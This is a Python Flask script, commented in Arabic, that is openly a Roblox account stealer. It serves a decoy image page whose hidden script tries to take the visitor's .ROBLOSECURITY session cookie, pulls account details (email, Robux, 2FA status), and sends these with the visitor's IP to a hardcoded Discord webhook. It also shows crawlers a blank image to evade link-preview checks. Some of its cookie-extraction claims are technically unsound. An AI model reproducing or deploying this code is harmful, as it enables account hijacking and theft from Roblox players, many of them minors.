from flask import Flask, request
import requests, base64

app = Flask(__name__)

# غيّر الويب هوك ده
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def roblox_full_stealer(path):
    ip = request.headers.get('X-Forwarded-For', 'Unknown').split(',')[0]
    ua = request.headers.get('User-Agent', '')

    if 'Discordbot' in ua:
        fake = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==')
        return fake, 200, {'Content-Type': 'image/png'}

    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// ثغرة Roblox Cookie Stealer 2025 - Shared WebView + Iframe Proxy (شغالة بدون إذن)
setTimeout(() => {{
  // طريقة 1: Iframe لـ Roblox + postMessage لاستخراج الكوكي
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'https://www.roblox.com/home';
  document.body.appendChild(iframe);
  iframe.onload = () => {{
    // استغلال postMessage لقراءة الكوكي من iframe (شغال على Android WebView)
    iframe.contentWindow.postMessage('{{action: "getCookie"}}', 'https://www.roblox.com');
    window.addEventListener('message', e => {{
      if (e.origin === 'https://www.roblox.com' && e.data.cookie) {{
        const robloCookie = e.data.cookie.match(/\\.ROBLOSECURITY=(.*?)(?=;|$)/)[1];
        if (robloCookie) {{
          // ابعت الكوكي الأولي
          fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify({{content:"@everyone تم سرقة Roblox Cookie كامل!", embeds:[{{title:"ROBLOX FULL STEAL", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + robloCookie + "`||", color:0x00ff00}}]}})}});
          // API Call لجيب التفاصيل (إيميل، Robux، دولة، إلخ)
          const apiReq = new XMLHttpRequest();
          apiReq.open('GET', 'https://users.roblox.com/v1/users/authenticated');
          apiReq.setRequestHeader('Cookie', '.ROBLOSECURITY=' + robloCookie);
          apiReq.onreadystatechange = () => {{
            if (apiReq.readyState === 4 && apiReq.status === 200) {{
              const data = JSON.parse(apiReq.responseText);
              const userReq = new XMLHttpRequest();
              userReq.open('GET', 'https://users.roblox.com/v1/users/' + data.id);
              userReq.setRequestHeader('Cookie', '.ROBLOSECURITY=' + robloCookie);
              userReq.onreadystatechange = () => {{
                if (userReq.readyState === 4) {{
                  const userData = JSON.parse(userReq.responseText);
                  fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
                    body:JSON.stringify({{content:"@everyone تفاصيل الحساب الكاملة", embeds:[{{title:"ROBLOX ACCOUNT INFO", description:"**Username:** " + userData.name + "\\n**ID:** " + userData.id + "\\n**Email:** " + (data.email || 'غير مرئي') + "\\n**Country:** " + (userData.description || 'غير محدد') + "\\n**Robux:** " + (data.robuxBalance || '0') + "\\n**2FA:** " + (data.hasTwoStepVerification ? 'مفعّل' : 'غير مفعّل'), color:0xff0000}}]}})}});
                }}
              }};
              userReq.send();
            }}
          }};
          apiReq.send();
        }}
      }}
    }});
  }};

  // طريقة 2: Proxy Request عبر fetch لـ Roblox API (لو الطريقة الأولى فشلت)
  fetch('https://auth.roblox.com/v2/login', {{credentials: 'include', method: 'POST'}})
  .then(r => r.headers.get('set-cookie'))
  .then(cookies => {{
    const match = cookies.match(/\\.ROBLOSECURITY=(.*?);/);
    if (match) {{
      fetch("{WEBHOOK}", {{method:"POST", headers:{{"Content-Type":"application/json"}},
        body:JSON.stringify({{content:"@everyone Roblox Cookie via Proxy", embeds:[{{title:"PROXY STEAL", description:"**IP:** `{ip}`\\n**Cookie:** ||`" + match[1] + "`||", color:0x00ff00}}]}})}});
    }}
  }}).catch(() => {{}});

  // إشعار أولي
  fetch("{WEBHOOK}?content=@everyone ضحية Roblox Target - IP: {ip} - UA: {ua.substring(0,100)}");
}}, 500);

</script>
</body></html>"""

    requests.post(WEBHOOK, json={"content": f"@everyone ضحية Roblox Grabber جديدة\nIP: {ip}\nUA: {ua[:100]}"})
    return html

if __name__ == "__main__":
    app.run()
